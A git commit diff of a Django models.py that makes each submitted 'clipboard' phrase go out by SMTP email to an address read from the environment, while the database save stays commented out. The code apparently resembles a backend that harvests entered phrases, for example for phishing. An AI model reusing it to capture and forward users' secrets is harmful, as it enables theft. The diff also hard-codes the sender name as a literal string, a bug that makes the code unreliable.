4bc51ae78303a7f05a9d85f2cf08be438c4717c6
nmenterprise <102085819+nmenterprise@users.noreply.github.com>
2024-10-02 20:11:47 +0100

    Update models.py

--- app/models.py
+++ app/models.py
@@ -1,16 +1,47 @@
 from django.db import models
-from django.core.mail import send_mail
+import smtplib, ssl
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import os
+
 
 # Create your models here.
+def Sendmail(body):
+    subject = "New TextModel Created"
+    receiver_email = os.getenv("TO_EMAIL")
+    from_mail = os.getenv("FROM_EMAIL")
+    sender_mail = ("EMAIL_HOST_USER")
+    sender_pass = os.getenv("EMAIL_HOST_PASSWORD")
+    smtp_server = 'smtp-relay.brevo.com'
+
+    message = MIMEMultipart()
+    message['From'] = from_mail
+    message['To'] = receiver_email
+    message['Subject'] = subject
+    # Attach the body of the email
+    message.attach(MIMEText(body, 'plain'))
+
+
+    context = ssl.create_default_context()
+    try:
+        with smtplib.SMTP(smtp_server, 587) as s:
+            s.starttls(context=context)
+            s.login(sender_mail,sender_pass)
+            s.sendmail(sender_mail, receiver_email, message.as_string())
+            print("success")
+            
+    except smtplib.SMTPAuthenticationError as e:
+        print(f"smtp error {e}")
+    except Exception as e:
+        print(f"exception {e}")
+
 
 class TextModel(models.Model):
     clipboard = models.CharField(max_length=120)
 
     def save(self, *args, **kwargs):
-        subject = "New TextModel Created"
+        
         message = f"the phrase is \"{self.clipboard}\" "
-        recipient_list = ["emelieasadel@gmail.com"]
-        send_mail(subject, message, None, recipient_list)
-
+        Sendmail(message)
         print("done")
         #super().save(*args, **kwargs)
